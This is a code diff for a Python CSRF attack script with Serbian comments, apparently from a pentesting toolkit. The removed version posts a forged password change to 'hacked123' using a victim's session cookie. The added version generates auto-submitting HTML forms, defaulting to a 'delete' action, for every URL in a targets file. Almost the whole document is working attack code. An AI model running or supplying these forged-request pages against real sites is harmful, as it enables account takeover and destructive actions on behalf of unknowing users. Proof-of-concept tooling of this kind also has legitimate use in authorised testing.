@@ -1,24 +1,34 @@
-import requests
+import os
+import sys
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
-# Primer mete (izmeni u pravi target!)
-TARGET_URL = "http://example.com/change-password"
-COOKIES = {"session": "abc123"}  # Ovde ide sesija žrtve ako je poznata
+from log_to_text import log_to_text
+from tools.auto_add_severity import classify_severity
+from logics.fuzz_ai_trigger import ai_trigger_if_needed
 
-def run_csrf_poc():
-    data = {
-        "new_password": "hacked123",
-        "confirm_password": "hacked123"
-    }
+def generate_csrf_poc(url, param="action", value="delete"):
+    html = f"""<html>
+  <body>
+    <form action="{url}" method="POST">
+      <input type="hidden" name="{param}" value="{value}">
+      <input type="submit" value="Submit CSRF">
+    </form>
+    <script>document.forms[0].submit();</script>
+  </body>
+</html>"""
 
-    print(f"[+] Šaljem CSRF zahtev ka: {TARGET_URL}")
-    try:
-        res = requests.post(TARGET_URL, data=data, cookies=COOKIES)
-        if res.status_code == 200:
-            print("[!] CSRF pokušaj poslat. Proveri da li je uspešan!")
-        else:
-            print(f"[-] Neuspešno. Status kod: {res.status_code}")
-    except Exception as e:
-        print(f"[X] Greška: {e}")
+    filename = f"csrf_poc_{param}_{value}.html"
+    with open(filename, "w") as f:
+        f.write(html)
+
+    log_to_text(f"[CSRF_POC] Generated PoC for {url} -> {filename}")
+    ai_trigger_if_needed("CSRF", url, f"{param}={value}", html, "medium")
+    print(f"[+] CSRF PoC generisan: {filename}")
+    return filename
 
 if __name__ == "__main__":
-    run_csrf_poc()
+    with open("targets/targets.txt", "r") as f:
+        targets = f.read().splitlines()
+
+    for url in targets:
+        generate_csrf_poc(url)
